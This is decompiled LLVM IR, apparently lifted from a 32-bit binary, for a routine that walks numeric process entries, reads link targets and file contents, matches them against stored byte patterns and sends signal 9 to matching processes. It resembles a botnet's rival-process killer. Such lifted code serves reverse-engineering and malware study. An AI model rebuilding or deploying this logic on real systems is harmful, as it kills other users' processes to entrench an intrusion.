  br i1 %v3_10005258, label %dec_label_pc_10005090, label %dec_label_pc_10005260

dec_label_pc_10005260:                            ; preds = %dec_label_pc_10005240
  store i32 268456552, i32* @lr, align 4
  %v1_10005264 = call i32 @function_10006bd8(i32 6)
  %v0_1000526813 = load i32, i32* @r27, align 4
  store i32 268456560, i32* @lr, align 4
  %v1_1000526c14 = inttoptr i32 %v0_1000526813 to i32*
  %v2_1000526c15 = call i32 @function_100083c4(i32* %v1_1000526c14)
  %v3_1000527018 = icmp eq i32 %v2_1000526c15, 0
  br i1 %v3_1000527018, label %dec_label_pc_100052d0, label %dec_label_pc_10005278.preheader

dec_label_pc_10005278.preheader:                  ; preds = %dec_label_pc_10005260, %dec_label_pc_10005268.backedge
  %v0_1000527821 = phi i32 [ %v2_1000526c, %dec_label_pc_10005268.backedge ], [ %v2_1000526c15, %dec_label_pc_10005260 ]
  br label %dec_label_pc_10005278

dec_label_pc_10005278:                            ; preds = %dec_label_pc_10005278.preheader, %dec_label_pc_100052bc
  %v0_1000528c = phi i32 [ %v0_1000527821, %dec_label_pc_10005278.preheader ], [ %v2_100052c4, %dec_label_pc_100052bc ]
  %v1_10005278 = add i32 %v0_1000528c, 11
  %v2_10005278 = inttoptr i32 %v1_10005278 to i8*
  %v3_10005278 = load i8, i8* %v2_10005278, align 1
  %v4_10005278 = zext i8 %v3_10005278 to i32
  %v1_1000527c = add nuw nsw i32 %v4_10005278, 208
  %v1_10005280 = urem i32 %v1_1000527c, 256
  %v2_10005284 = icmp ugt i32 %v1_10005280, 9
  br i1 %v2_10005284, label %dec_label_pc_10005268.backedge, label %dec_label_pc_1000528c

dec_label_pc_1000528c:                            ; preds = %dec_label_pc_10005278
  %v0_10005290 = load i32, i32* @r23, align 4
  %v1_10005290 = add i32 %v0_10005290, 1
  store i32 %v1_10005290, i32* @r23, align 4
  store i32 268456604, i32* @lr, align 4
  %v3_10005298 = call i32 @function_10009410(i8* %v2_10005278, i32 %v1_10005280)
  %v0_1000529c = load i32, i32* @r28, align 4
  %v2_1000529c = icmp slt i32 %v0_1000529c, %v3_10005298
  store i32 %v3_10005298, i32* %r30.global-to-local, align 4
  br i1 %v2_1000529c, label %dec_label_pc_100052dc, label %dec_label_pc_100052a8

dec_label_pc_100052a8:                            ; preds = %dec_label_pc_1000528c
  store i32 268456624, i32* @lr, align 4
  %v0_100052ac = call i32 @function_10008138()
  %v0_100052b0 = load i32, i32* @r29, align 4
  %v2_100052b0 = sub i32 %v0_100052ac, %v0_100052b0
  %tmp86 = icmp slt i32 %v2_100052b0, 601
  br i1 %tmp86, label %dec_label_pc_10005438, label %dec_label_pc_100052bc

dec_label_pc_100052bc:                            ; preds = %dec_label_pc_100052a8
  %v0_100052bc = load i32, i32* @r27, align 4
  store i32 400, i32* %r28.global-to-local, align 4
  store i32 268456648, i32* @lr, align 4
  %v1_100052c4 = inttoptr i32 %v0_100052bc to i32*
  %v2_100052c4 = call i32 @function_100083c4(i32* %v1_100052c4)
  %v3_100052c8 = icmp eq i32 %v2_100052c4, 0
  br i1 %v3_100052c8, label %dec_label_pc_100052d0, label %dec_label_pc_10005278

dec_label_pc_100052d0:                            ; preds = %dec_label_pc_10005268.backedge, %dec_label_pc_100052bc, %dec_label_pc_10005260
  %v0_100052d0 = load i32, i32* @r27, align 4
  store i32 268456664, i32* @lr, align 4
  %v1_100052d4 = inttoptr i32 %v0_100052d0 to i32*
  %v2_100052d4 = call i32 @function_10008210(i32* %v1_100052d4)
  br label %dec_label_pc_10005240

dec_label_pc_100052dc:                            ; preds = %dec_label_pc_1000528c
  store i32 268456676, i32* @lr, align 4
  %v0_100052e0 = call i32 @function_10008138()
  store i32 %v0_100052e0, i32* %r19.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100052f0.90 to i32), i32* @lr, align 4
  %v1_100052ec = call i32 @function_10006c64(i32 6)
  store i32 268456696, i32* @lr, align 4
  %v1_100052f4 = call i32 @function_10006c64(i32 7)
  %v3_10005300 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 %v2_10005234, i32* @r3, align 4
  %v3_1000530c = call i32 @function_10007504(i8* %v2_1000530c, i32 %v3_10005300)
  %v0_10005310 = load i32, i32* @r31, align 4
  %v0_10005314 = load i32, i32* @r22, align 4
  %v2_10005314 = add i32 %v0_10005314, %v3_1000530c
  store i32 %v2_10005314, i32* %r28.global-to-local, align 4
  store i32 %v2_10005314, i32* @r3, align 4
  %v2_1000531c = inttoptr i32 %v2_10005314 to i8*
  %v3_1000531c = call i32 @function_10007504(i8* %v2_1000531c, i32 %v0_10005310)
  store i32 %v3_1000531c, i32* %r29.global-to-local, align 4
  %v3_1000532c = call i32 @function_10006bb0(i32 7, i32* null)
  %v2_10005334 = add i32 %v3_1000531c, %v2_10005314
  store i32 %v2_10005334, i32* @r3, align 4
  %v2_10005338 = inttoptr i32 %v2_10005334 to i8*
  %v3_10005338 = call i32 @function_10007504(i8* %v2_10005338, i32 %v3_1000532c)
  %v3_10005344 = call i32 @function_10006bb0(i32 6, i32* null)
  store i32 %v2_10005238, i32* @r3, align 4
  %v3_10005350 = call i32 @function_10007504(i8* %v2_10005350, i32 %v3_10005344)
  %v0_10005354 = load i32, i32* @r31, align 4
  %v0_10005358 = load i32, i32* %r20.global-to-local, align 4
  %v2_10005358 = add i32 %v0_10005358, %v3_10005350
  store i32 %v2_10005358, i32* %r28.global-to-local, align 4
  store i32 %v2_10005358, i32* @r3, align 4
  %v2_10005360 = inttoptr i32 %v2_10005358 to i8*
  %v3_10005360 = call i32 @function_10007504(i8* %v2_10005360, i32 %v0_10005354)
  store i32 %v3_10005360, i32* %r29.global-to-local, align 4
  %v3_10005370 = call i32 @function_10006bb0(i32 11, i32* null)
  %v2_10005378 = add i32 %v3_10005360, %v2_10005358
  store i32 %v2_10005378, i32* @r3, align 4
  %v2_1000537c = inttoptr i32 %v2_10005378 to i8*
  %v3_1000537c = call i32 @function_10007504(i8* %v2_1000537c, i32 %v3_10005370)
  store i32 ptrtoint ([3 x i8]* @global_var_10005388.92 to i32), i32* @lr, align 4
  %v1_10005384 = call i32 @function_10006bd8(i32 6)
  store i32 268456848, i32* @lr, align 4
  %v1_1000538c = call i32 @function_10006bd8(i32 7)
  store i32 4095, i32* @r5, align 4
  store i32 268456864, i32* @lr, align 4
  %v3_1000539c = call i32 @function_10007fe8(i32 %v2_10005234, i32 %v2_1000523c, i32 4095)
  %v3_100053a0 = icmp eq i32 %v3_1000539c, -1
  store i32 %v3_1000539c, i32* %r29.global-to-local, align 4
  br i1 %v3_100053a0, label %dec_label_pc_1000548c, label %dec_label_pc_100053ac

dec_label_pc_100053ac:                            ; preds = %dec_label_pc_100052dc
  %v0_100053ac = load i32, i32* @r1, align 4
  %v2_100053ac = add i32 %v0_100053ac, %v3_1000539c
  %v3_100053b4 = add i32 %v2_100053ac, 188
  %v4_100053b4 = inttoptr i32 %v3_100053b4 to i8*
  store i8 0, i8* %v4_100053b4, align 1
  store i32 268456896, i32* @lr, align 4
  %v1_100053bc = call i32 @function_10006c64(i32 10)
  %v3_100053c8 = call i32 @function_10006bb0(i32 10, i32* null)
  %v0_100053cc = load i32, i32* %r29.global-to-local, align 4
  %v1_100053cc = add i32 %v0_100053cc, -1
  %v4_100053d8 = call i32 @function_1000788c(i8* %v3_100053d8, i32 %v1_100053cc, i32 %v3_100053c8)
  %v3_100053dc = icmp eq i32 %v4_100053d8, -1
  br i1 %v3_100053dc, label %dec_label_pc_100053f8, label %dec_label_pc_100053e4

dec_label_pc_100053e4:                            ; preds = %dec_label_pc_100053ac
  store i32 268456940, i32* @lr, align 4
  %v1_100053e8 = call i32 @function_10008180(i32 %v2_1000523c)
  %v0_100053ec = load i32, i32* %r30.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100053f8.93 to i32), i32* @lr, align 4
  %v2_100053f4 = call i32 @function_10007e88(i32 %v0_100053ec, i32 9)
  br label %dec_label_pc_100053f8

dec_label_pc_100053f8:                            ; preds = %dec_label_pc_100053ac, %dec_label_pc_100053e4
  store i32 ptrtoint (i32* @global_var_10005400.94 to i32), i32* @lr, align 4
  %v1_100053fc = call i32 @function_10006bd8(i32 10)
  store i32 268456964, i32* @lr, align 4
  %v0_10005400 = call i32 @function_10007df8()
  %v0_10005404 = load i32, i32* %r30.global-to-local, align 4
  %v4_10005404 = icmp eq i32 %v0_10005404, %v0_10005400
  br i1 %v4_10005404, label %dec_label_pc_1000542c, label %dec_label_pc_1000540c

dec_label_pc_1000540c:                            ; preds = %dec_label_pc_100053f8
  store i32 268456976, i32* @lr, align 4
  %v0_1000540c = call i32 @function_10007e40()
  %v0_10005410 = load i32, i32* %r30.global-to-local, align 4
  %v4_10005410 = icmp eq i32 %v0_10005410, %v0_1000540c
  br i1 %v4_10005410, label %dec_label_pc_1000542c, label %dec_label_pc_10005418

dec_label_pc_10005418:                            ; preds = %dec_label_pc_1000540c
  %v3_10005418 = load i32, i32* @global_var_1001b298.85, align 4
  %v3_10005420 = call i32 @function_10007938(i8* %v3_100053d8, i32 %v3_10005418)
  %v3_10005424 = icmp eq i32 %v3_10005420, 0
  br i1 %v3_10005424, label %dec_label_pc_10005468, label %dec_label_pc_10005418.dec_label_pc_1000542c_crit_edge

dec_label_pc_10005418.dec_label_pc_1000542c_crit_edge: ; preds = %dec_label_pc_10005418
  %v0_1000542c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1000542c

dec_label_pc_1000542c:                            ; preds = %dec_label_pc_10005418.dec_label_pc_1000542c_crit_edge, %dec_label_pc_1000540c, %dec_label_pc_100053f8
  %v0_1000542c = phi i32 [ %v0_1000542c.pre, %dec_label_pc_10005418.dec_label_pc_1000542c_crit_edge ], [ %v0_1000540c, %dec_label_pc_1000540c ], [ %v0_10005400, %dec_label_pc_100053f8 ]
  store i32 %v0_1000542c, i32* %r28.global-to-local, align 4
  %v0_10005430 = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_10005430, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005268.backedge

dec_label_pc_10005268.backedge:                   ; preds = %dec_label_pc_10005278, %dec_label_pc_1000542c, %dec_label_pc_1000545c, %dec_label_pc_100056cc, %dec_label_pc_10005438, %dec_label_pc_10005440
  %v0_10005268 = load i32, i32* @r27, align 4
  store i32 268456560, i32* @lr, align 4
  %v1_1000526c = inttoptr i32 %v0_10005268 to i32*
  %v2_1000526c = call i32 @function_100083c4(i32* %v1_1000526c)
  %v3_10005270 = icmp eq i32 %v2_1000526c, 0
  br i1 %v3_10005270, label %dec_label_pc_100052d0, label %dec_label_pc_10005278.preheader

dec_label_pc_10005438:                            ; preds = %dec_label_pc_100052a8
  %v0_10005438 = load i32, i32* %r30.global-to-local, align 4
  %tmp87 = icmp slt i32 %v0_10005438, 401
  br i1 %tmp87, label %dec_label_pc_10005268.backedge, label %dec_label_pc_10005440

dec_label_pc_10005440:                            ; preds = %dec_label_pc_10005438
  %v0_10005448 = load i32, i32* @r23, align 4
  %v1_1000544c = urem i32 %v0_10005448, 10
  %v4_10005454 = icmp eq i32 %v1_1000544c, 0
  br i1 %v4_10005454, label %dec_label_pc_1000545c, label %dec_label_pc_10005268.backedge

dec_label_pc_1000545c:                            ; preds = %dec_label_pc_10005440
  store i32 268457060, i32* @lr, align 4
  %v1_10005460 = call i32 @function_1000965c(i32 1)
  br label %dec_label_pc_10005268.backedge

dec_label_pc_10005468:                            ; preds = %dec_label_pc_10005418
  store i32 268457080, i32* @lr, align 4
  %v2_10005474 = call i32 @function_10007ed0(i32 %v2_1000523c, i32 0)
  %v3_10005478 = icmp eq i32 %v2_10005474, -1
  store i32 %v2_10005474, i32* @r31, align 4
  br i1 %v3_10005478, label %dec_label_pc_10005728, label %dec_label_pc_10005484

dec_label_pc_10005484:                            ; preds = %dec_label_pc_10005468, %dec_label_pc_10005728
  store i32 268457100, i32* @lr, align 4
  %v0_10005488 = call i32 @function_10007d68()
  br label %dec_label_pc_1000548c

dec_label_pc_1000548c:                            ; preds = %dec_label_pc_100052dc, %dec_label_pc_10005484
  store i32 268457116, i32* @lr, align 4
  %v2_10005498 = call i32 @function_10007ed0(i32 %v2_10005234, i32 0)
  %v3_1000549c = icmp eq i32 %v2_10005498, -1
  store i32 %v2_10005498, i32* %r24.global-to-local, align 4
  br i1 %v3_1000549c, label %dec_label_pc_100056cc, label %dec_label_pc_100054a8

dec_label_pc_100054a8:                            ; preds = %dec_label_pc_1000548c
  store i32 ptrtoint ([3 x i8]* @global_var_100054b0.95 to i32), i32* @lr, align 4
  %v1_100054ac = call i32 @function_10006c64(i32 12)
  store i32 ptrtoint ([3 x i8]* @global_var_100054b8.96 to i32), i32* @lr, align 4
  %v1_100054b4 = call i32 @function_10006c64(i32 13)
  store i32 ptrtoint ([3 x i8]* @global_var_100054c0.97 to i32), i32* @lr, align 4
  %v1_100054bc = call i32 @function_10006c64(i32 14)
  store i32 ptrtoint ([3 x i8]* @global_var_100054c8.98 to i32), i32* @lr, align 4
  %v1_100054c4 = call i32 @function_10006c64(i32 15)
  store i32 268457168, i32* @lr, align 4
  %v1_100054cc = call i32 @function_10006c64(i32 16)
  %v3_100054d8 = call i32 @function_10006bb0(i32 12, i32* nonnull %stack_var_-8452)
  store i32 %v3_100054d8, i32* @r31, align 4
  %v3_100054e8 = call i32 @function_10006bb0(i32 13, i32* nonnull %stack_var_-8448)
  store i32 %v3_100054e8, i32* %r29.global-to-local, align 4
  %v3_100054f8 = call i32 @function_10006bb0(i32 14, i32* nonnull %stack_var_-8444)
  store i32 %v3_100054f8, i32* %r28.global-to-local, align 4
  %v3_10005508 = call i32 @function_10006bb0(i32 15, i32* nonnull %stack_var_-8456)
  store i32 %v3_10005508, i32* %r26.global-to-local, align 4
  %v3_10005518 = call i32 @function_10006bb0(i32 16, i32* nonnull %stack_var_-8440)
  store i32 %v3_10005518, i32* %r25.global-to-local, align 4
  %v0_1000552094 = load i32, i32* %r24.global-to-local, align 4
  store i32 268457264, i32* @lr, align 4
  %v3_1000552c95 = call i32 @function_10007fa0(i32 %v0_1000552094, i32 %v2_1000515c, i32 4096)
  %tmp8897 = icmp slt i32 %v3_1000552c95, 1
  br i1 %tmp8897, label %dec_label_pc_10005738, label %dec_label_pc_10005538

dec_label_pc_10005538:                            ; preds = %dec_label_pc_100054a8, %dec_label_pc_10005520.backedge
  %v3_1000552c98 = phi i32 [ %v3_1000552c, %dec_label_pc_10005520.backedge ], [ %v3_1000552c95, %dec_label_pc_100054a8 ]
  %v3_1000553099.in = phi i32 [ %v3_1000552c, %dec_label_pc_10005520.backedge ], [ %v3_1000552c95, %dec_label_pc_100054a8 ]
  %v3_1000553099 = icmp eq i32 %v3_1000553099.in, 0
  %v3_10005538 = load i32, i32* %stack_var_-8452, align 4
  %v2_1000553c = icmp slt i32 %v3_1000552c98, %v3_10005538
  br i1 %v2_1000553c, label %dec_label_pc_1000557c, label %dec_label_pc_10005544

dec_label_pc_10005544:                            ; preds = %dec_label_pc_10005538
  store i32 0, i32* %r11.global-to-local, align 4
  %v0_10005558.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005558

dec_label_pc_10005558:                            ; preds = %dec_label_pc_10005544, %dec_label_pc_10005574
  %v0_10005578 = phi i32 [ %v3_1000552c98, %dec_label_pc_10005544 ], [ %v1_10005578, %dec_label_pc_10005574 ]
  %v0_10005574 = phi i32 [ %v2_1000515c, %dec_label_pc_10005544 ], [ %v1_10005574, %dec_label_pc_10005574 ]
  %v1_10005558 = phi i32 [ 0, %dec_label_pc_10005544 ], [ %v1_1000555825, %dec_label_pc_10005574 ]
  %v2_10005558 = add i32 %v1_10005558, %v0_10005558.pre
  %v3_10005558 = inttoptr i32 %v2_10005558 to i8*
  %v4_10005558 = load i8, i8* %v3_10005558, align 1
  %v1_1000555c = add i32 %v1_10005558, 1
  store i32 %v1_1000555c, i32* %r11.global-to-local, align 4
  %v1_10005560 = inttoptr i32 %v0_10005574 to i8*
  %v2_10005560 = load i8, i8* %v1_10005560, align 1
  %v4_10005568 = icmp eq i8 %v2_10005560, %v4_10005558
  br i1 %v4_10005568, label %dec_label_pc_1000568c, label %dec_label_pc_10005570

dec_label_pc_10005570:                            ; preds = %dec_label_pc_10005558
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005574

dec_label_pc_10005574:                            ; preds = %dec_label_pc_1000568c, %dec_label_pc_10005570
  %v1_1000555825 = phi i32 [ %v1_1000555c, %dec_label_pc_1000568c ], [ 0, %dec_label_pc_10005570 ]
  %v1_10005574 = add i32 %v0_10005574, 1
  %v1_10005578 = add i32 %v0_10005578, -1
  %v2_10005578 = icmp eq i32 %v1_10005578, 0
  br i1 %v2_10005578, label %dec_label_pc_1000557c, label %dec_label_pc_10005558

dec_label_pc_1000557c:                            ; preds = %dec_label_pc_10005574, %dec_label_pc_10005538
  %v3_1000557c = load i32, i32* %stack_var_-8448, align 4
  %v2_10005580 = icmp slt i32 %v3_1000552c98, %v3_1000557c
  br i1 %v2_10005580, label %dec_label_pc_100055c0, label %dec_label_pc_10005588

dec_label_pc_10005588:                            ; preds = %dec_label_pc_1000557c
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_1000553099, label %dec_label_pc_100055c0, label %dec_label_pc_1000559c.preheader

dec_label_pc_1000559c.preheader:                  ; preds = %dec_label_pc_10005588
  %v0_1000559c.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1000559c

dec_label_pc_1000559c:                            ; preds = %dec_label_pc_1000559c.preheader, %dec_label_pc_100055bc
  %v0_100055bc = phi i32 [ %v3_1000552c98, %dec_label_pc_1000559c.preheader ], [ %v1_100055bc, %dec_label_pc_100055bc ]
  %storemerge.in = phi i32 [ %v2_1000515c, %dec_label_pc_1000559c.preheader ], [ %storemerge, %dec_label_pc_100055bc ]
  %v1_1000559c = phi i32 [ 0, %dec_label_pc_1000559c.preheader ], [ %v1_1000559c31, %dec_label_pc_100055bc ]
  %v2_1000559c = add i32 %v1_1000559c, %v0_1000559c.pre
  %v3_1000559c = inttoptr i32 %v2_1000559c to i8*
  %v4_1000559c = load i8, i8* %v3_1000559c, align 1
  %v1_100055a0 = add i32 %v1_1000559c, 1
  store i32 %v1_100055a0, i32* %r11.global-to-local, align 4
  %v1_100055a4 = inttoptr i32 %storemerge.in to i8*
  %v2_100055a4 = load i8, i8* %v1_100055a4, align 1
  %v4_100055ac = icmp eq i8 %v2_100055a4, %v4_1000559c
  br i1 %v4_100055ac, label %dec_label_pc_100056f8, label %dec_label_pc_100055b4

dec_label_pc_100055b4:                            ; preds = %dec_label_pc_1000559c
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100055bc

dec_label_pc_100055bc:                            ; preds = %dec_label_pc_100056f8, %dec_label_pc_100055b4
  %v1_1000559c31 = phi i32 [ %v1_100055a0, %dec_label_pc_100056f8 ], [ 0, %dec_label_pc_100055b4 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_100055bc = add i32 %v0_100055bc, -1
  %v2_100055bc = icmp eq i32 %v1_100055bc, 0
  br i1 %v2_100055bc, label %dec_label_pc_100055c0, label %dec_label_pc_1000559c

dec_label_pc_100055c0:                            ; preds = %dec_label_pc_100055bc, %dec_label_pc_10005588, %dec_label_pc_1000557c
  %v3_100055c0 = load i32, i32* %stack_var_-8444, align 4
  %v2_100055c4 = icmp slt i32 %v3_1000552c98, %v3_100055c0
  br i1 %v2_100055c4, label %dec_label_pc_10005604, label %dec_label_pc_100055cc

dec_label_pc_100055cc:                            ; preds = %dec_label_pc_100055c0
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_1000553099, label %dec_label_pc_10005604, label %dec_label_pc_100055e0.preheader

dec_label_pc_100055e0.preheader:                  ; preds = %dec_label_pc_100055cc
  %v0_100055e0.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_100055e0

dec_label_pc_100055e0:                            ; preds = %dec_label_pc_100055e0.preheader, %dec_label_pc_10005600
  %v0_10005600 = phi i32 [ %v3_1000552c98, %dec_label_pc_100055e0.preheader ], [ %v1_10005600, %dec_label_pc_10005600 ]
  %storemerge3.in = phi i32 [ %v2_1000515c, %dec_label_pc_100055e0.preheader ], [ %storemerge3, %dec_label_pc_10005600 ]
  %v1_100055e0 = phi i32 [ 0, %dec_label_pc_100055e0.preheader ], [ %v1_100055e037, %dec_label_pc_10005600 ]
  %v2_100055e0 = add i32 %v1_100055e0, %v0_100055e0.pre
  %v3_100055e0 = inttoptr i32 %v2_100055e0 to i8*
  %v4_100055e0 = load i8, i8* %v3_100055e0, align 1
  %v1_100055e4 = add i32 %v1_100055e0, 1
  store i32 %v1_100055e4, i32* %r11.global-to-local, align 4
  %v1_100055e8 = inttoptr i32 %storemerge3.in to i8*
  %v2_100055e8 = load i8, i8* %v1_100055e8, align 1
  %v4_100055f0 = icmp eq i8 %v2_100055e8, %v4_100055e0
  br i1 %v4_100055f0, label %dec_label_pc_10005704, label %dec_label_pc_100055f8

dec_label_pc_100055f8:                            ; preds = %dec_label_pc_100055e0
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005600

dec_label_pc_10005600:                            ; preds = %dec_label_pc_10005704, %dec_label_pc_100055f8
  %v1_100055e037 = phi i32 [ %v1_100055e4, %dec_label_pc_10005704 ], [ 0, %dec_label_pc_100055f8 ]
  %storemerge3 = add i32 %storemerge3.in, 1
  %v1_10005600 = add i32 %v0_10005600, -1
  %v2_10005600 = icmp eq i32 %v1_10005600, 0
  br i1 %v2_10005600, label %dec_label_pc_10005604, label %dec_label_pc_100055e0

dec_label_pc_10005604:                            ; preds = %dec_label_pc_10005600, %dec_label_pc_100055cc, %dec_label_pc_100055c0
  %v3_10005604 = load i32, i32* %stack_var_-8456, align 4
  %v2_10005608 = icmp slt i32 %v3_1000552c98, %v3_10005604
  br i1 %v2_10005608, label %dec_label_pc_10005648, label %dec_label_pc_10005610

dec_label_pc_10005610:                            ; preds = %dec_label_pc_10005604
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_1000553099, label %dec_label_pc_10005648, label %dec_label_pc_10005624.preheader

dec_label_pc_10005624.preheader:                  ; preds = %dec_label_pc_10005610
  %v0_10005624.pre = load i32, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10005624

dec_label_pc_10005624:                            ; preds = %dec_label_pc_10005624.preheader, %dec_label_pc_10005644
  %v0_10005644 = phi i32 [ %v3_1000552c98, %dec_label_pc_10005624.preheader ], [ %v1_10005644, %dec_label_pc_10005644 ]
  %storemerge4.in = phi i32 [ %v2_1000515c, %dec_label_pc_10005624.preheader ], [ %storemerge4, %dec_label_pc_10005644 ]
  %v1_10005624 = phi i32 [ 0, %dec_label_pc_10005624.preheader ], [ %v1_1000562443, %dec_label_pc_10005644 ]
  %v2_10005624 = add i32 %v1_10005624, %v0_10005624.pre
  %v3_10005624 = inttoptr i32 %v2_10005624 to i8*
  %v4_10005624 = load i8, i8* %v3_10005624, align 1
  %v1_10005628 = add i32 %v1_10005624, 1
  store i32 %v1_10005628, i32* %r11.global-to-local, align 4
  %v1_1000562c = inttoptr i32 %storemerge4.in to i8*
  %v2_1000562c = load i8, i8* %v1_1000562c, align 1
  %v4_10005634 = icmp eq i8 %v2_1000562c, %v4_10005624
  br i1 %v4_10005634, label %dec_label_pc_10005710, label %dec_label_pc_1000563c

dec_label_pc_1000563c:                            ; preds = %dec_label_pc_10005624
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005644

dec_label_pc_10005644:                            ; preds = %dec_label_pc_10005710, %dec_label_pc_1000563c
  %v1_1000562443 = phi i32 [ %v1_10005628, %dec_label_pc_10005710 ], [ 0, %dec_label_pc_1000563c ]
  %storemerge4 = add i32 %storemerge4.in, 1
  %v1_10005644 = add i32 %v0_10005644, -1
  %v2_10005644 = icmp eq i32 %v1_10005644, 0
  br i1 %v2_10005644, label %dec_label_pc_10005648, label %dec_label_pc_10005624

dec_label_pc_10005648:                            ; preds = %dec_label_pc_10005644, %dec_label_pc_10005610, %dec_label_pc_10005604
  %v3_10005648 = load i32, i32* %stack_var_-8440, align 4
  %v2_1000564c = icmp slt i32 %v3_1000552c98, %v3_10005648
  br i1 %v2_1000564c, label %dec_label_pc_10005520.backedge, label %dec_label_pc_10005654

dec_label_pc_10005654:                            ; preds = %dec_label_pc_10005648
  store i32 0, i32* %r11.global-to-local, align 4
  br i1 %v3_1000553099, label %dec_label_pc_10005520.backedge, label %dec_label_pc_10005668.lr.ph

dec_label_pc_10005520.backedge:                   ; preds = %dec_label_pc_10005664.backedge, %dec_label_pc_10005654, %dec_label_pc_10005648
  %v0_10005520 = load i32, i32* %r24.global-to-local, align 4
  store i32 268457264, i32* @lr, align 4
  %v3_1000552c = call i32 @function_10007fa0(i32 %v0_10005520, i32 %v2_1000515c, i32 4096)
  %tmp88 = icmp slt i32 %v3_1000552c, 1
  br i1 %tmp88, label %dec_label_pc_10005738, label %dec_label_pc_10005538

dec_label_pc_10005668.lr.ph:                      ; preds = %dec_label_pc_10005654
  %v0_10005668.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_10005668

dec_label_pc_10005668:                            ; preds = %dec_label_pc_10005668.lr.ph, %dec_label_pc_10005664.backedge
  %v0_10005664 = phi i32 [ %v3_1000552c98, %dec_label_pc_10005668.lr.ph ], [ %v1_10005664, %dec_label_pc_10005664.backedge ]
  %storemerge19.in = phi i32 [ %v2_1000515c, %dec_label_pc_10005668.lr.ph ], [ %storemerge19, %dec_label_pc_10005664.backedge ]
  %v1_10005668 = phi i32 [ 0, %dec_label_pc_10005668.lr.ph ], [ %v1_1000566849, %dec_label_pc_10005664.backedge ]
  %v2_10005668 = add i32 %v1_10005668, %v0_10005668.pre
  %v3_10005668 = inttoptr i32 %v2_10005668 to i8*
  %v4_10005668 = load i8, i8* %v3_10005668, align 1
  %v1_1000566c = add i32 %v1_10005668, 1
  store i32 %v1_1000566c, i32* %r11.global-to-local, align 4
  %v1_10005670 = inttoptr i32 %storemerge19.in to i8*
  %v2_10005670 = load i8, i8* %v1_10005670, align 1
  %v4_10005678 = icmp eq i8 %v2_10005670, %v4_10005668
  br i1 %v4_10005678, label %dec_label_pc_1000571c, label %dec_label_pc_10005680

dec_label_pc_10005680:                            ; preds = %dec_label_pc_10005668
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10005664.backedge

dec_label_pc_10005664.backedge:                   ; preds = %dec_label_pc_1000571c, %dec_label_pc_10005680
  %v1_1000566849 = phi i32 [ 0, %dec_label_pc_10005680 ], [ %v1_1000566c, %dec_label_pc_1000571c ]
  %storemerge19 = add i32 %storemerge19.in, 1
  %v1_10005664 = add i32 %v0_10005664, -1
  %v2_10005664 = icmp eq i32 %v1_10005664, 0
  br i1 %v2_10005664, label %dec_label_pc_10005520.backedge, label %dec_label_pc_10005668

dec_label_pc_1000568c:                            ; preds = %dec_label_pc_10005558
  %v4_10005564 = icmp eq i32 %v3_10005538, %v1_1000555c
  br i1 %v4_10005564, label %dec_label_pc_10005690, label %dec_label_pc_10005574

dec_label_pc_10005690:                            ; preds = %dec_label_pc_1000568c, %dec_label_pc_100056f8, %dec_label_pc_10005704, %dec_label_pc_10005710, %dec_label_pc_1000571c
  store i32 ptrtoint ([3 x i8]* @global_var_10005698.99 to i32), i32* @lr, align 4
  %v1_10005694 = call i32 @function_10006bd8(i32 12)
  store i32 ptrtoint ([3 x i8]* @global_var_100056a0.100 to i32), i32* @lr, align 4
  %v1_1000569c = call i32 @function_10006bd8(i32 13)
  store i32 ptrtoint ([3 x i8]* @global_var_100056a8.101 to i32), i32* @lr, align 4
  %v1_100056a4 = call i32 @function_10006bd8(i32 14)
  store i32 ptrtoint ([3 x i8]* @global_var_100056b0.102 to i32), i32* @lr, align 4
  %v1_100056ac = call i32 @function_10006bd8(i32 15)
  store i32 268457656, i32* @lr, align 4
  %v1_100056b4 = call i32 @function_10006bd8(i32 16)
  store i32 268457664, i32* @lr, align 4
  %v0_100056bc = call i32 @function_10007d68()
  %v0_100056c0 = load i32, i32* %r30.global-to-local, align 4
  store i32 268457676, i32* @lr, align 4
  %v2_100056c8 = call i32 @function_10007e88(i32 %v0_100056c0, i32 9)
  br label %dec_label_pc_100056cc

dec_label_pc_100056cc:                            ; preds = %dec_label_pc_1000548c, %dec_label_pc_10005738, %dec_label_pc_10005690
  store i32 64, i32* @r4, align 4
  store i32 %v2_10005234, i32* @r3, align 4
  store i32 268457688, i32* @lr, align 4
  %v0_100056d4 = call i32 @function_10007584()
  store i32 %v2_10005238, i32* @r3, align 4
  store i32 64, i32* @r4, align 4
  %v0_100056e0 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_100056e0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100056e8.103 to i32), i32* @lr, align 4
  %v0_100056e4 = call i32 @function_10007584()
  store i32 268457712, i32* @lr, align 4
  %v1_100056ec = call i32 @function_1000965c(i32 1)
  %v0_100056f0 = load i32, i32* %r19.global-to-local, align 4
  store i32 %v0_100056f0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005268.backedge

dec_label_pc_100056f8:                            ; preds = %dec_label_pc_1000559c
  %v4_100055a8 = icmp eq i32 %v3_1000557c, %v1_100055a0
  br i1 %v4_100055a8, label %dec_label_pc_10005690, label %dec_label_pc_100055bc

dec_label_pc_10005704:                            ; preds = %dec_label_pc_100055e0
  %v4_100055ec = icmp eq i32 %v3_100055c0, %v1_100055e4
  br i1 %v4_100055ec, label %dec_label_pc_10005690, label %dec_label_pc_10005600

